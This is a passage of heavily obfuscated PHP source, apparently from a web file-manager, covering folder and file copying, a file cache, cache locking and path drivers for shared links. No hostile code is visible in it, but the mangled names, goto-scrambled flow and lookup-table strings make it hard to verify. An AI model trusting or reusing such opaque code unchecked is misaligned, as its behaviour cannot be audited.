$A­Â²¾ßİ¥); $A­Îòƒªø = $this->mkdir($fğñŒ÷Šğè, $A­Â²¾ßİ¥, $cƒŒ™²İ•); if (!$EáÈ‡Æ‹„ || $cƒŒ™²İ• == REPEAT_RENAME_FOLDER) { $cƒŒ™²İ• = !1; } goto c´ˆæ¨Â‡ß; B¹ÈáÊ¼•Œ: Model($DÄŒäÊÔˆÚ[530])->addAll($AåÖ±ğ¿èµ[$DÄŒäÊÔˆÚ[528]], array(), !0); Model($DÄŒäÊÔˆÚ[531])->eventCopy($A­Îòƒªø); $this->saveAll($AåÖ±ğ¿èµ[$DÄŒäÊÔˆÚ[529]]); goto cˆ‚‡‰‘¨«; cˆ¹„®à×½: $DÄŒäÊÔˆÚ =& $_SERVER[¢ÌÛ]; $AåÖ±ğ¿èµ = array($DÄŒäÊÔˆÚ[528] => array(), $DÄŒäÊÔˆÚ[529] => array(), $DÄŒäÊÔˆÚ[527] => array(), $DÄŒäÊÔˆÚ[563] => array()); $A­Â²¾ßİ¥ = $b›òÀÕƒÇƒ ? $b›òÀÕƒÇƒ : $A‰Š¿«¸’->pathThis($Eè™…°â„°); goto b„ƒ‡Äº”æ; cˆ‚‡‰‘¨«: Model($DÄŒäÊÔˆÚ[448])->linkAdd($AåÖ±ğ¿èµ[$DÄŒäÊÔˆÚ[527]]); Model($DÄŒäÊÔˆÚ[448])->remove($AåÖ±ğ¿èµ[$DÄŒäÊÔˆÚ[563]]); $this->folderSizeReset($fğñŒ÷Šğè); goto b¶Å»‰•; e®Ş“÷ĞÈï: } private function _copyChildTo($eèø…Ğ½³, $bËÎĞ”·¹â, $CÃô ¶“í, $cØî›ø°½ƒ, &$a£ãìŞòê®, $DÃ¯Œƒ ¡) { goto C†ğÉ¹Õ×; C†ğÉ¹Õ×: $Eª¿»™Àâ¢ =& $_SERVER[¢ÌÛ]; $B¨°½Àáƒä = $this->sourceInfoCache($CÃô ¶“í); $a „Ñè…‘­ = $eèø…Ğ½³->listPath($bËÎĞ”·¹â); goto fĞ°ëøèàÖ; BÇëÈ±«°£: foreach ($CÀ¥»‘ŒÖ• as &$E±î§óƒç·) { goto Bİ‰Ù…¦íŒ; cÅÚóòïì: $E±î§óƒç·[$Eª¿»™Àâ¢[77]] = _get($E±î§óƒç·, $Eª¿»™Àâ¢[77], 0); $E±î§óƒç·[$Eª¿»™Àâ¢[445]] = _get($E±î§óƒç·, $Eª¿»™Àâ¢[445], 0); if (!isset($E±î§óƒç·[$Eª¿»™Àâ¢[566]]) && $E±î§óƒç·[$Eª¿»™Àâ¢[445]]) { $a£ãìŞòê®[$Eª¿»™Àâ¢[563]][] = $E±î§óƒç·[$Eª¿»™Àâ¢[445]]; } goto C•ïùîÈôµ; Bİ‰Ù…¦íŒ: if (isset($Dô¡Àƒ¼Ö“[$E±î§óƒç·[$Eª¿»™Àâ¢[28]]])) { $E±î§óƒç· = $Dô¡Àƒ¼Ö“[$E±î§óƒç·[$Eª¿»™Àâ¢[28]]]; } $E±î§óƒç·[$Eª¿»™Àâ¢[397]] = $E±î§óƒç·[$Eª¿»™Àâ¢[29]] == $Eª¿»™Àâ¢[76]; $E±î§óƒç·[$Eª¿»™Àâ¢[399]] = _get($E±î§óƒç·, $Eª¿»™Àâ¢[167], $Eª¿»™Àâ¢[33]); goto cÅÚóòïì; C•ïùîÈôµ: if ($cØî›ø°½ƒ) { $c™¯Ö³Ë = $this->fileNameExistCache($CÃô ¶“í, $E±î§óƒç·[$Eª¿»™Àâ¢[28]]); if ($c™¯Ö³Ë) { if ($E±î§óƒç·[$Eª¿»™Àâ¢[397]] || $cØî›ø°½ƒ == REPEAT_SKIP) { continue; } if ($cØî›ø°½ƒ == REPEAT_REPLACE) { $FßØÈíš‘» = $this->sourceInfoCache($c™¯Ö³Ë); $bŠ·¶‰¯§÷ = $this->fileHistory($FßØÈíš‘», $E±î§óƒç·[$Eª¿»™Àâ¢[445]], $E±î§óƒç·[$Eª¿»™Àâ¢[77]]); if ($bŠ·¶‰¯§÷) { $a£ãìŞòê®[$Eª¿»™Àâ¢[527]][] = $E±î§óƒç·[$Eª¿»™Àâ¢[445]]; } continue; } else { if ($cØî›ø°½ƒ == REPEAT_RENAME) { $E±î§óƒç·[$Eª¿»™Àâ¢[28]] = $this->fileNameAutoCache($CÃô ¶“í, $E±î§óƒç·[$Eª¿»™Àâ¢[28]], $cØî›ø°½ƒ, !1); } } } } if (!$E±î§óƒç·[$Eª¿»™Àâ¢[397]] && $E±î§óƒç·[$Eª¿»™Àâ¢[445]]) { $a£ãìŞòê®[$Eª¿»™Àâ¢[527]][] = $E±î§óƒç·[$Eª¿»™Àâ¢[445]]; } $dÙÕíæ¡…Ê[] = $this->_makeItemData($E±î§óƒç·, $B¨°½Àáƒä, $E±î§óƒç·[$Eª¿»™Àâ¢[28]]); goto d¦”×®‹Êˆ; d¦”×®‹Êˆ: } unset($E±î§óƒç·); if (!empty($dÙÕíæ¡…Ê)) { $this->addAll($dÙÕíæ¡…Ê); $this->_childrenListSelect($CÃô ¶“í); } goto e´¸ğ×·•; fĞ°ëøèàÖ: $CÀ¥»‘ŒÖ• = array_merge($a „Ñè…‘­[$Eª¿»™Àâ¢[73]], $a „Ñè…‘­[$Eª¿»™Àâ¢[74]]); $Dô¡Àƒ¼Ö“ = $this->_addFiles($eèø…Ğ½³, $a „Ñè…‘­[$Eª¿»™Àâ¢[73]], $DÃ¯Œƒ ¡); $dÙÕíæ¡…Ê = array(); goto BÇëÈ±«°£; e´¸ğ×·•: $Eø¸£ÑÆÙ³ = $this->_childrenList($CÃô ¶“í); $Eø¸£ÑÆÙ³ = array_to_keyvalue($Eø¸£ÑÆÙ³, $Eª¿»™Àâ¢[28]); foreach ($CÀ¥»‘ŒÖ• as $E±î§óƒç·) { $FßØÈíš‘» = $Eø¸£ÑÆÙ³[$E±î§óƒç·[$Eª¿»™Àâ¢[28]]]; $däôÖâª‚ß = $FßØÈíš‘»[$Eª¿»™Àâ¢[396]]; $this->_copyApplyMeta($FßØÈíš‘», $a£ãìŞòê®); if ($E±î§óƒç·[$Eª¿»™Àâ¢[29]] == $Eª¿»™Àâ¢[76]) { $E±î§óƒç·[$Eª¿»™Àâ¢[75]] = $eèø…Ğ½³->getPathInner($E±î§óƒç·[$Eª¿»™Àâ¢[75]]); $this->_copyChildTo($eèø…Ğ½³, $E±î§óƒç·[$Eª¿»™Àâ¢[75]], $däôÖâª‚ß, $cØî›ø°½ƒ, $a£ãìŞòê®, $DÃ¯Œƒ ¡); } } goto E†§æî’Ãí; E†§æî’Ãí: } private function _addFiles($A³Ğ²‹ËÑğ, $cŒŞ©‰İÑ„, $a¸ö¶Öçğã) { goto E¤ÓÖõ ‰Ÿ; EÛíôÂ½Åí: foreach ($E–ßî‡Âî as $D­¾ìÉæ) { if (!isset($dÕç½²è¼[$D­¾ìÉæ[$Fç°ê¼ñ¾[169]]])) { continue; } $FÏ…½»–œÎ = $dÕç½²è¼[$D­¾ìÉæ[$Fç°ê¼ñ¾[169]]]; foreach ($FÏ…½»–œÎ as &$EÓòÍ„²ˆ½) { $EÓòÍ„²ˆ½[$Fç°ê¼ñ¾[445]] = $D­¾ìÉæ[$Fç°ê¼ñ¾[445]]; $EÓòÍ„²ˆ½[$Fç°ê¼ñ¾[566]] = !0; } unset($EÓòÍ„²ˆ½); } $bì‹ĞóÍğå = array(); foreach ($cŒŞ©‰İÑ„ as $A‰ëÙÎ«Ö´) { if (isset($A‰ëÙÎ«Ö´[$Fç°ê¼ñ¾[566]]) && $A‰ëÙÎ«Ö´[$Fç°ê¼ñ¾[566]]) { continue; } $C«­ÚÆÆàÉ = $A³Ğ²‹ËÑğ->getPathInner($A‰ëÙÎ«Ö´[$Fç°ê¼ñ¾[75]]); $FËßÈÁ¹‡ = $Cˆ•‚ÓÅëŠ->addFileMake($C«­ÚÆÆàÉ, $A‰ëÙÎ«Ö´[$Fç°ê¼ñ¾[77]], $A‰ëÙÎ«Ö´[$Fç°ê¼ñ¾[170]], $A‰ëÙÎ«Ö´[$Fç°ê¼ñ¾[169]], $A‰ëÙÎ«Ö´[$Fç°ê¼ñ¾[28]], $a¸ö¶Öçğã); $bì‹ĞóÍğå[] = $FËßÈÁ¹‡; } goto DÒĞ·—®š; DÒĞ·—®š: $Cˆ•‚ÓÅëŠ->addAll($bì‹ĞóÍğå); $aëÍœùÔñ = array($Fç°ê¼ñ¾[169] => array($Fç°ê¼ñ¾[7], array_keys($dÕç½²è¼))); $E–ßî‡Âî = $Cˆ•‚ÓÅëŠ->where($aëÍœùÔñ)->select(); goto eÔëİø¢Ÿˆ; dÎğÁŒÔß: foreach ($cŒŞ©‰İÑ„ as $a¶»‰è½å) { $Bçõš”«ôª[$a¶»‰è½å[$Fç°ê¼ñ¾[28]]] = $a¶»‰è½å; } return $Bçõš”«ôª; goto cŞ½âÄ½’ˆ; F‡“‹ˆ¢“†: $Cˆ•‚ÓÅëŠ = Model($Fç°ê¼ñ¾[569]); $E–ßî‡Âî = $Cˆ•‚ÓÅëŠ->where($aëÍœùÔñ)->select(); $E–ßî‡Âî = $E–ßî‡Âî ? $E–ßî‡Âî : array(); goto EÛíôÂ½Åí; a¼ÃŠäÃ¥µ: foreach ($cŒŞ©‰İÑ„ as &$EÓòÍ„²ˆ½) { goto Eæî„†¯¶†; Eæî„†¯¶†: Hook::trigger($Fç°ê¼ñ¾[567], $EÓòÍ„²ˆ½); $EÓòÍ„²ˆ½[$Fç°ê¼ñ¾[75]] = $A³Ğ²‹ËÑğ->getPathInner($EÓòÍ„²ˆ½[$Fç°ê¼ñ¾[75]]); $E£‘™ò¸Ü = $A³Ğ²‹ËÑğ->hashSimple($EÓòÍ„²ˆ½[$Fç°ê¼ñ¾[75]]); goto a«Á§ôØöÆ; a«Á§ôØöÆ: $f„Äí¦ôÒï = $A³Ğ²‹ËÑğ->hashMd5($EÓòÍ„²ˆ½[$Fç°ê¼ñ¾[75]]); if (strlen($f„Äí¦ôÒï) > 10 && !isset($dÕç½²è¼[$f„Äí¦ôÒï])) { $dÕç½²è¼[$f„Äí¦ôÒï] = array(); } $EÓòÍ„²ˆ½[$Fç°ê¼ñ¾[170]] = $E£‘™ò¸Ü; goto c•İ•åõ¿ƒ; e»‘„˜¹ˆÃ: if (count($dÕç½²è¼[$f„Äí¦ôÒï]) > 1) { $EÓòÍ„²ˆ½[$Fç°ê¼ñ¾[566]] = !0; } goto d“Ó‚îÀÈñ; c•İ•åõ¿ƒ: $EÓòÍ„²ˆ½[$Fç°ê¼ñ¾[169]] = $f„Äí¦ôÒï; Hook::trigger($Fç°ê¼ñ¾[568], $EÓòÍ„²ˆ½); $dÕç½²è¼[$f„Äí¦ôÒï][] =& $EÓòÍ„²ˆ½; goto e»‘„˜¹ˆÃ; d“Ó‚îÀÈñ: } unset($EÓòÍ„²ˆ½); $aëÍœùÔñ = array($Fç°ê¼ñ¾[169] => array($Fç°ê¼ñ¾[7], array_keys($dÕç½²è¼))); goto F‡“‹ˆ¢“†; E¤ÓÖõ ‰Ÿ: $Fç°ê¼ñ¾ =& $_SERVER[¢ÌÛ]; if (!$cŒŞ©‰İÑ„ || count($cŒŞ©‰İÑ„) == 0) { return array(); } $dÕç½²è¼ = array(); goto a¼ÃŠäÃ¥µ; eÔëİø¢Ÿˆ: $E–ßî‡Âî = $E–ßî‡Âî ? $E–ßî‡Âî : array(); foreach ($E–ßî‡Âî as $D­¾ìÉæ) { if (!isset($dÕç½²è¼[$D­¾ìÉæ[$Fç°ê¼ñ¾[169]]])) { continue; } $bï­µ‚Ôß =& $dÕç½²è¼[$D­¾ìÉæ[$Fç°ê¼ñ¾[169]]]; foreach ($bï­µ‚Ôß as &$EÓòÍ„²ˆ½) { $EÓòÍ„²ˆ½[$Fç°ê¼ñ¾[445]] = $D­¾ìÉæ[$Fç°ê¼ñ¾[445]]; } unset($EÓòÍ„²ˆ½); } $Bçõš”«ôª = array(); goto dÎğÁŒÔß; cŞ½âÄ½’ˆ: } } define($_SERVER[¢ÌÛ][570], $_SERVER[¢ÌÛ][571]); goto fÀ‘Š¬åœ; B¶§„ß¯à: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($fƒËŞÆ¾ã‘, $A×˜à¢œÀò) { $a®²µÈê¥ =& $_SERVER[¢ÌÛ]; $this->cachePath = $fƒËŞÆ¾ã‘[$a®²µÈê¥[75]]; $this->prefix = $a®²µÈê¥[783]; $this->cacheTime = $A×˜à¢œÀò; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($BÍÚùİ‚™İ) { $dğåâ¥ƒ =& $_SERVER[¢ÌÛ]; $BÍÚùİ‚™İ = str_replace(array($dğåâ¥ƒ[784], $dğåâ¥ƒ[96], $dğåâ¥ƒ[69]), $dğåâ¥ƒ[785], $BÍÚùİ‚™İ); return $this->cachePath . $dğåâ¥ƒ[786] . $BÍÚùİ‚™İ . $dğåâ¥ƒ[787]; } public function set($BÄÒ¸²™ò , $B¶ÇÛî ‡, $b‘ŒµçÕ² = false) { $c†êÜÌ• = $this->getFile($BÄÒ¸²™ò ); if (file_put_contents($c†êÜÌ•, $this->prefix . $B¶ÇÛî ‡, LOCK_EX)) { return !0; } @unlink($c†êÜÌ•); return !1; } public function get($c‹Ø§ŠÍ‘¡) { $fÄ¦‰„ÌÑ = $this->getFile($c‹Ø§ŠÍ‘¡); if (file_exists($fÄ¦‰„ÌÑ) && filemtime($fÄ¦‰„ÌÑ) < time() - $this->cacheTime) { @unlink($fÄ¦‰„ÌÑ); return !1; } $Fç¨·æï½é = @file_get_contents($fÄ¦‰„ÌÑ); return substr($Fç¨·æï½é, strlen($this->prefix)); } public function remove($EŒƒ³‹İ×) { $A«š˜ÊÇ = $this->getFile($EŒƒ³‹İ×); return @unlink($A«š˜ÊÇ); } public function deleteAll() { $c„áÒ«ˆŒ =& $_SERVER[¢ÌÛ]; $F‹¦Ç¿Àœ = scandir($this->cachePath); foreach ($F‹¦Ç¿Àœ as $f¥ÙÓáŠî) { $aî¤õ‘Å‘ = $this->cachePath . $f¥ÙÓáŠî; if (strpos($aî¤õ‘Å‘, $c„áÒ«ˆŒ[787]) && strpos($aî¤õ‘Å‘, $c„áÒ«ˆŒ[788])) { @unlink($aî¤õ‘Å‘); } } } public function clearTimeout() { $d–Ãª¹¥ğ® =& $_SERVER[¢ÌÛ]; $b¦„»áÁÏİ = scandir($this->cachePath); foreach ($b¦„»áÁÏİ as $Båôóé”÷) { $e’§Öº¤ß¹ = $this->cachePath . $Båôóé”÷; if (strpos($e’§Öº¤ß¹, $d–Ãª¹¥ğ®[787]) && strpos($e’§Öº¤ß¹, $d–Ãª¹¥ğ®[788]) && filemtime($e’§Öº¤ß¹) < time() - $this->cacheTime) { @unlink($e’§Öº¤ß¹); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto DöÚëİ™”; d¸¼÷Ñ÷›ë: if ($Bä‘õ·˜­¢ == $dœ÷İ·…–‘[17] && $CÛ—‘Ô„»Í == $dœ÷İ·…–‘[9]) { $Bä‘õ·˜­¢ = $dœ÷İ·…–‘[173]; } switch ($Bä‘õ·˜­¢) { case $dœ÷İ·…–‘[779]: self::$handle = new CacheLockRedis(); break; case $dœ÷İ·…–‘[780]: self::$handle = new CacheLockMemcached(); break; case $dœ÷İ·…–‘[17]: self::$handle = new CacheLockDatabase(); break; case $dœ÷İ·…–‘[173]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto fïÛĞóÛŒà; a­‹ÚšÁñ: self::$timeout = $F÷éÍÊÙˆ[$dœ÷İ·…–‘[789]] ? $F÷éÍÊÙˆ[$dœ÷İ·…–‘[789]] : 10; $CÛ—‘Ô„»Í = _get($GLOBALS[$dœ÷İ·…–‘[6]], $dœ÷İ·…–‘[790]); $Bä‘õ·˜­¢ = $F÷éÍÊÙˆ[$dœ÷İ·…–‘[776]] ? $F÷éÍÊÙˆ[$dœ÷İ·…–‘[776]] : $dœ÷İ·…–‘[173]; goto d¸¼÷Ñ÷›ë; DöÚëİ™”: $dœ÷İ·…–‘ =& $_SERVER[¢ÌÛ]; if (self::$handle) { return self::$handle; } $F÷éÍÊÙˆ = $GLOBALS[$dœ÷İ·…–‘[6]][$dœ÷İ·…–‘[345]]; goto a­‹ÚšÁñ; fïÛĞóÛŒà: } private static function key($cîò¤ËÇ¬) { return $_SERVER[¢ÌÛ][791] . Cache::key($cîò¤ËÇ¬); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($dğÓ¬óí†è = '') { self::$errorMsg = $dğÓ¬óí†è; } public static function lockGlobal($D¹äŠÌÃÕ, $f¥à†•®‡î) { return self::lock($D¹äŠÌÃÕ, $f¥à†•®‡î, !0); } public static function lock($BœàìéŒíÀ, $eõòÃ’ÛôÊ = false, $Eåß“ÜªÈÈ = false) { goto c°Åñ·İå; EŞø„Ò°•¯: if (!$Eåß“ÜªÈÈ) { self::$lockItem[$AÅëÍßù³Œ] = !0; } return $c¼©Œ‚‘§˜; goto cš¼ª´…ğ; c°Åñ·İå: $B‚Ê°Ü‰ç =& $_SERVER[¢ÌÛ]; $DãåÑ°ôƒ– = self::init(); $AÅëÍßù³Œ = self::key($BœàìéŒíÀ); goto A´ÚØáÖˆº; A´ÚØáÖˆº: $eõòÃ’ÛôÊ = $eõòÃ’ÛôÊ ? $eõòÃ’ÛôÊ : self::$timeout; $c¼©Œ‚‘§˜ = $DãåÑ°ôƒ–->lock($AÅëÍßù³Œ, $eõòÃ’ÛôÊ); if (!$c¼©Œ‚‘§˜) { $c¹½æ‹ò°» = "\x6c\157\x63\x6b\x20\x65\x72\x72\157\x72\73\x6b\x65\171\75{$AÅëÍßù³Œ}\x3b\x74\151\155\x65\x3d{$eõòÃ’ÛôÊ}\x3b" . self::$errorMsg . $B‚Ê°Ü‰ç[67] . get_caller_msg(); $d™ÏÜ²ùº = LNG($B‚Ê°Ü‰ç[792]) . "\50{$eõòÃ’ÛôÊ}\163\x29\x2e" . LNG($B‚Ê°Ü‰ç[793]); $d™ÏÜ²ùº .= $B‚Ê°Ü‰ç[794]; if (is_string(self::$errorMsg) && self::$errorMsg) { $d™ÏÜ²ùº = $d™ÏÜ²ùº . $B‚Ê°Ü‰ç[795] . self::$errorMsg; } write_log($c¹½æ‹ò°», $B‚Ê°Ü‰ç[796]); show_json($d™ÏÜ²ùº, !1); } goto EŞø„Ò°•¯; cš¼ª´…ğ: } public static function lockGet($b¢™†Ø±˜) { $bå¸ Æ†ö = self::key($b¢™†Ø±˜); if (self::$lockItem[$bå¸ Æ†ö]) { return self::$lockItem[$bå¸ Æ†ö]; } return self::init()->lockGet($bå¸ Æ†ö); } public static function unlock($F¸Œ“•Ã³«) { $eÕ…àã ™è = self::key($F¸Œ“•Ã³«); self::$lockItem[$eÕ…àã ™è] = null; return self::init()->unlock($eÕ…àã ™è); } public static function unlockRuntime() { $bãøò”Ú™¼ =& $_SERVER[¢ÌÛ]; $dİé¶ÖÕÜ´ = self::init(); $a¿ÜÅÛÔ®Ó = !1; foreach (self::$lockItem as $fİÚœ“®³¡ => $E»×ªèŒÎš) { if (!$E»×ªèŒÎš) { continue; } $dİé¶ÖÕÜ´->unlock($fİÚœ“®³¡); if (!$a¿ÜÅÛÔ®Ó) { $a¿ÜÅÛÔ®Ó = !0; write_log($bãøò”Ú™¼[797] . $fİÚœ“®³¡ . $bãøò”Ú™¼[67] . get_caller_msg(), $bãøò”Ú™¼[796]); continue; } write_log($bãøò”Ú™¼[797] . $fİÚœ“®³¡, $bãøò”Ú™¼[796]); } self::fileUnlockAll(); } public static function fileLock($Eé„šé‡»Æ) { goto b…ªàµŒƒ°; dÀÆ³›Ô: $fŞÖ”º­æò = fopen(DATA_PATH . $Eé„šé‡»Æ . $F³éáÕ”Ä’[799], $F³éáÕ”Ä’[800]); if (!$fŞÖ”º­æò) { return !1; } $GLOBALS[$F³éáÕ”Ä’[798]][$Eé„šé‡»Æ] = $fŞÖ”º­æò; goto bîÍ˜°ôŒ; bîÍ˜°ôŒ: if (flock($fŞÖ”º­æò, LOCK_EX)) { return !0; } self::unlock($Eé„šé‡»Æ); show_json($F³éáÕ”Ä’[801], !1); goto fÍ¢ÎˆÔËò; b…ªàµŒƒ°: $F³éáÕ”Ä’ =& $_SERVER[¢ÌÛ]; if (!$GLOBALS[$F³éáÕ”Ä’[798]]) { $GLOBALS[$F³éáÕ”Ä’[798]] = array(); } $GLOBALS[$F³éáÕ”Ä’[798]][$Eé„šé‡»Æ] = !1; goto dÀÆ³›Ô; fÍ¢ÎˆÔËò: return !1; goto A·Å­ğŞ£‹; A·Å­ğŞ£‹: } public static function fileUnlock($b¥Öˆ†ùÚ) { $cÂ®ÆÑ¯‹­ =& $_SERVER[¢ÌÛ]; $Bè§´“…©¾ = $GLOBALS[$cÂ®ÆÑ¯‹­[798]][$b¥Öˆ†ùÚ]; if (!$Bè§´“…©¾) { return; } $GLOBALS[$cÂ®ÆÑ¯‹­[798]][$b¥Öˆ†ùÚ] = !1; flock($Bè§´“…©¾, LOCK_UN); fclose($Bè§´“…©¾); } public static function fileUnlockAll() { $EÓ·Á¹×ØØ =& $_SERVER[¢ÌÛ]; if (!$GLOBALS[$EÓ·Á¹×ØØ[798]]) { return; } foreach ($GLOBALS[$EÓ·Á¹×ØØ[798]] as $C¢™ÓœÛ§Ö => $B¥‰ïéªíİ) { if (!$B¥‰ïéªíİ) { continue; } $GLOBALS[$EÓ·Á¹×ØØ[798]][$C¢™ÓœÛ§Ö] = !1; flock($B¥‰ïéªíİ, LOCK_UN); fclose($B¥‰ïéªíİ); } $GLOBALS[$EÓ·Á¹×ØØ[798]] = array(); } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } goto D—×«¨Ñò‹; Eƒ­ÙÒ»‘¹: class PathDriverDbShareItem extends PathDriverDB { public function __construct($aÌì—‰ñ¬Ô) { $this->pathParse = $aÌì—‰ñ¬Ô; $this->model = Model($_SERVER[¢ÌÛ][1178]); } public function getPathOuter($eğ©éö¾±Õ) { $A’ºŸš°¢š =& $_SERVER[¢ÌÛ]; if (!$eğ©éö¾±Õ) { return $eğ©éö¾±Õ; } $D–Áê½ Ñã = $this->parse($eğ©éö¾±Õ); return trim(KodIO::makeShare($this->pathParse[$A’ºŸš°¢š[385]], $D–Áê½ Ñã[$A’ºŸš°¢š[385]]), $A’ºŸš°¢š[8]); } protected function infoParse($a…¦áÁ®¥ä, $AšÑŠ¨‘¶ = false, $bÍ±ªŠçòŞ = false) { $BÔ­ˆ…¶èâ =& $_SERVER[¢ÌÛ]; $f²¼æŞÉòÔ = $this->pathParse[$BÔ­ˆ…¶èâ[385]]; $Fˆøß¬Ì®© = trim($this->pathParse[$BÔ­ˆ…¶èâ[1040]], $BÔ­ˆ…¶èâ[8]); return Action($BÔ­ˆ…¶èâ[1185])->sharePathInfo($f²¼æŞÉòÔ, $Fˆøß¬Ì®©); } public function infoFull($DÜîƒ¶—ë) { $D´øŸÈ•©÷ =& $_SERVER[¢ÌÛ]; $f›‡¬ÄŞ°É = explode($D´øŸÈ•©÷[8], trim($DÜîƒ¶—ë, $D´øŸÈ•©÷[8])); if (count($f›‡¬ÄŞ°É) > 1) { $B£’„ğ¶õ = implode($D´øŸÈ•©÷[8], array_splice($f›‡¬ÄŞ°É, 1)); $Aéì¿Ğ¼éÙ = $this->model->pathInfoByPath($f›‡¬ÄŞ°É[0], $B£’„ğ¶õ); if (!$Aéì¿Ğ¼éÙ) { return !1; } $this->pathParse[$D´øŸÈ•©÷[1040]] = $Aéì¿Ğ¼éÙ[$D´øŸÈ•©÷[396]]; } return $this->infoParse($DÜîƒ¶—ë); } public function listAll($fÕƒ°º¦À) { goto Cè²ñ¯ïê•; bÄƒ©Ü‘²—: $Aíìí‡äÇÉ = $this->model->listAll($fÕƒ°º¦À); $E‰‚‘‚Â† = Model($d‹•ËÇê¸[561])->getInfo($AŞÈóÊÃ†¸[$d‹•ËÇê¸[466]]); $f©ÜÔ–Ïš = Action($d‹•ËÇê¸[1185]); goto eÓº´ø‰àĞ; Cè²ñ¯ïê•: $d‹•ËÇê¸ =& $_SERVER[¢ÌÛ]; $AŞÈóÊÃ†¸ = IO::info($this->pathParse[$d‹•ËÇê¸[75]]); if (!$AŞÈóÊÃ†¸) { return array(); } goto bÄƒ©Ü‘²—; eÓº´ø‰àĞ: foreach ($Aíìí‡äÇÉ as &$a½šœ÷˜ù) { check_abort(); $a½šœ÷˜ù[$d‹•ËÇê¸[84]] = $f©ÜÔ–Ïš->_shareItemeParse($a½šœ÷˜ù[$d‹•ËÇê¸[84]], $E‰‚‘‚Â†); } unset($a½šœ÷˜ù); return $Aíìí‡äÇÉ; goto CÔŞØ×¢ñ; CÔŞØ×¢ñ: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($Fá…ß”Ò‘Œ) { $this->pathParse = $Fá…ß”Ò‘Œ; $this->model = Model($_SERVER[¢ÌÛ][1178]); } protected function infoParse($CŒ„Û¢ãÀ¥, $a¡øœ¼¶­ = false, $e·Ì–ë« = false) { $B¸ĞøÇ”‚Ÿ =& $_SERVER[¢ÌÛ]; return Action($B¸ĞøÇ”‚Ÿ[1046])->sharePathInfo($this->pathParse[$B¸ĞøÇ”‚Ÿ[75]], !0); } public function listPath($A’¤ÅŸÔÒ, $F¤‡‰í­…í = false) { $AÍñî»©ƒ¹ =& $_SERVER[¢ÌÛ]; $a÷Å‘›”õä = parent::listPath($A’¤ÅŸÔÒ, $F¤‡‰í­…í); foreach ($a÷Å‘›”õä as $dÈ¸¿£Ñ³ => $cÕáïÍ›¶¿) { if (!in_array($dÈ¸¿£Ñ³, array($AÍñî»©ƒ¹[73], $AÍñî»©ƒ¹[74]))) { continue; } foreach ($cÕáïÍ›¶¿ as $fƒÆ¯Ì«ò¸ => $a¡é™‘Å™«) { $a÷Å‘›”õä[$dÈ¸¿£Ñ³][$fƒÆ¯Ì«ò¸] = Action($AÍñî»©ƒ¹[1046])->shareItemInfo($a¡é™‘Å™«); } } return $a÷Å‘›”õä; } public function listAll($D¾ó¬Ø‡¥š) { goto CÑé¶šö³è; CÑé¶šö³è: $c¾ÚÖŒÀ¸ =& $_SERVER[¢ÌÛ]; $E”½Ì–¹¦” = IO::info($this->pathParse[$c¾ÚÖŒÀ¸[75]]); if (!$E”½Ì–¹¦”) { return array(); } goto dÛéÒÅ§; dÛéÒÅ§: $aÕ¾Í‚–Ëª = $this->model->listAll($D¾ó¬Ø‡¥š); foreach ($aÕ¾Í‚–Ëª as &$f»ß”Øî˜ç) { $f»ß”Øî˜ç[$c¾ÚÖŒÀ¸[84]] = Action($c¾ÚÖŒÀ¸[1046])->shareItemInfo($f»ß”Øî˜ç[$c¾ÚÖŒÀ¸[84]]); } unset($f»ß”Øî˜ç); goto D¶¤Ÿò¼†; D¶¤Ÿò¼†: return $aÕ¾Í‚–Ëª; goto D´›İ£Š½†; D´›İ£Š½†: } } class PathDriverDriverShareItem { public function __construct($CïµãàŠ„‹) { $this->pathParse = $CïµãàŠ„‹; } public function __call($AÒ–È‰Ô¬, $aéòî¢‹Œ) { $aÁ‡ÆáÚäÛ =& $_SERVER[¢ÌÛ]; if (method_exists($this, $AÒ–È‰Ô¬)) { return; } $fÀŠ½´ÎÔÕ = call_user_func_array(array($aÁ‡ÆáÚäÛ[1186], $AÒ–È‰Ô¬), $aéòî¢‹Œ); $AÂÍ´»¬ïÄ = array($aÁ‡ÆáÚäÛ[1187], $aÁ‡ÆáÚäÛ[1188], $aÁ‡ÆáÚäÛ[1189], $aÁ‡ÆáÚäÛ[1190], $aÁ‡ÆáÚäÛ[516], $aÁ‡ÆáÚäÛ[518], $aÁ‡ÆáÚäÛ[1191], $aÁ‡ÆáÚäÛ[106], $aÁ‡ÆáÚäÛ[1192], $aÁ‡ÆáÚäÛ[1193]); if (in_array($AÒ–È‰Ô¬, $AÂÍ´»¬ïÄ)) { $fÀŠ½´ÎÔÕ = $this->getPathOuter($fÀŠ½´ÎÔÕ); } return $fÀŠ½´ÎÔÕ; } public function copy($f­©±’Ÿ¥Œ, $c¢ æ¡ÛÖî, $e»“ì¾¶ = false) { return $this->copyMove($f­©±’Ÿ¥Œ, $c¢ æ¡ÛÖî, $e»“ì¾¶, $_SERVER[¢ÌÛ][516]); } public function move($f‚ ³Ö÷¶À, $B¤Î“İ¾é, $DÑ¨®ØæÑ£ = false) { return $this->copyMove($f‚ ³Ö÷¶À, $B¤Î“İ¾é, $DÑ¨®ØæÑ£, $_SERVER[¢ÌÛ][518]); } private function copyMove($C¾Àï÷Úõ, $C¸•³¦Ò¢ˆ, $fÅ“ µëä„, $E¹È˜ÕÖ”ò) { goto D×ØÖŸ½¢; D×ØÖŸ½¢: $cÕ’•ğ’á¥ =& $_SERVER[¢ÌÛ]; $CòîÌÁÆ® = $C¸•³¦Ò¢ˆ; $e»” ®±¶¾ = IO::driverMake($C¸•³¦Ò¢ˆ); goto E§šƒ¾‘¼İ; E§šƒ¾‘¼İ: if ($e»” ®±¶¾->pathParse[$cÕ’•ğ’á¥[1024]]) { $C¸•³¦Ò¢ˆ = $e»” ®±¶¾->pathParse[$cÕ’•ğ’á¥[1024]]; } else { $C¸•³¦Ò¢ˆ = $CòîÌÁÆ®; } $bÒ¼¾¶¢ Ô = IO::copyMove($C¾Àï÷Úõ, $C¸•³¦Ò¢ˆ, $fÅ“ µëä„, $E¹È˜ÕÖ”ò); $bÒ¼¾¶¢ Ô = $this->getPathOuter($bÒ¼¾¶¢ Ô); goto F³ëá«™Ï; F³ëá«™Ï: return $bÒ¼¾¶¢ Ô; goto D¦ ½¸†ìØ; D¦ 